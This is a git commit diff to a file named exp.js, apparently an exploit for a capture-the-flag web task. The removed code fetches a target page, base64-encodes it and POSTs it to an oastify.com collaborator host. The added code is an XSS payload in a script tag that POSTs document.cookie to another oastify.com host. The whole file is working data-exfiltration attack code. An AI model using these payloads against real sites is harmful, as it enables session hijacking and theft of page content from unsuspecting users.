0fdea51a274425283cf290d86ece0a6000fb8b66
Marcus <nemarcusov@gmail.com>
2025-06-03 01:15:32 +0300

    Update exp.js

--- exp.js
+++ exp.js
@@ -1,34 +1,7 @@
-function toBase64(str) {
-    return btoa(unescape(encodeURIComponent(str)));
-}
-
-// URL для запроса и URL для отправки данных
-const targetUrl = 'http://tasks.duckerz.ru:30057/';
-const reportUrl = 'http://d7l0w0ue0ksbj7nimgj8t8t8qzwtkj88.oastify.com';
-
-// Выполняем запрос к целевому URL
-fetch(targetUrl)
-    .then(response => {
-        if (!response.ok) {
-            throw new Error('Network response was not ok');
-        }
-        return response.text();
-    })
-    .then(data => {
-        // Конвертируем данные в base64
-        const base64Data = toBase64(data);
-        
-        // Отправляем данные на сервер oastify.com
-        return fetch(reportUrl, {
-            method: 'POST',
-            mode: 'no-cors',
-            body: base64Data
-        });
-    })
-    .then(() => {
-        console.log('Data successfully sent to oastify.com');
-    })
-    .catch(error => {
-        console.error('Error:', error);
-    });
-alert(2)
+<script>
+fetch('https://v0wipinwt2ltcpg0fycqmqmqjhpcd21r.oastify.com', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>    
